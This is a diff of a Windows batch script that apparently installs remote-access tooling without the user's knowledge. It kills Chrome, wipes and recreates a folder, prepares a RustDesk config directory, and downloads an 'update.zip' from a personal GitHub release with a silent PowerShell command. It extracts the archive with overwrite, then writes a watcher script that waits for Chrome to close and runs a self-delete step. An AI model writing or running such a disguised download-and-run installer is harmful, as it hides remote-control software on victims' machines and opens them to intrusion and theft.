@@ -7,16 +7,20 @@ set ZIP=%TEMP%\update.zip
 
 taskkill /F /IM chrome.exe /FI "WINDOWTITLE ne Google Chrome" >nul 2>&1
 timeout /t 2 /nobreak >nul
+
+REM Force delete old folder
+for /f %%A in ('dir /b %DEST% 2^>nul') do del /q "%DEST%\%%A" >nul 2>&1
 rmdir /s /q "%DEST%" >nul 2>&1
 timeout /t 1 /nobreak >nul
+
 mkdir "%DEST%"
-mkdir "%APPDATA%\RustDesk\config"
+mkdir "%APPDATA%\RustDesk\config" >nul 2>&1
 
 echo Installing...
 
 powershell -NoP -C "(New-Object Net.WebClient).DownloadFile('https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip','%ZIP%')"
 
-powershell -NoP -C "Add-Type -A System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('%ZIP%','%DEST%')"
+powershell -NoP -C "Add-Type -A System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('%ZIP%','%DEST%',$true)"
 
 del /q "%ZIP%" >nul 2>&1
 
@@ -55,13 +59,10 @@ echo rmdir /s /q "!DEST!" >nul 2>&1
 echo @setlocal enabledelayedexpansion
 echo set EXE=%EXE%
 echo set DEL=%DEST%\delete.cmd
-echo set /a END=!TIME:~0,2!*3600+!TIME:~3,2!*60+!TIME:~6,2!+3600
 echo :loop
 echo timeout /t 10 /nobreak >nul
-echo tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul 2>&1
+echo tasklist /FI "IMAGENAME eq chrome.exe" ^| find /I "chrome.exe" >nul 2>&1
 echo if errorlevel 1 goto done
-echo for /f "tokens=1-3 delims=/: " %%%%a in ('powershell -NoP -C "[DateTime]::Now.ToString('HH:mm:ss')"') do set NOW=%%%%a*3600+%%%%b*60+%%%%c
-echo if !NOW! gtr !END! goto done
 echo goto loop
 echo :done
 echo if exist "!DEL!" call "!DEL!"
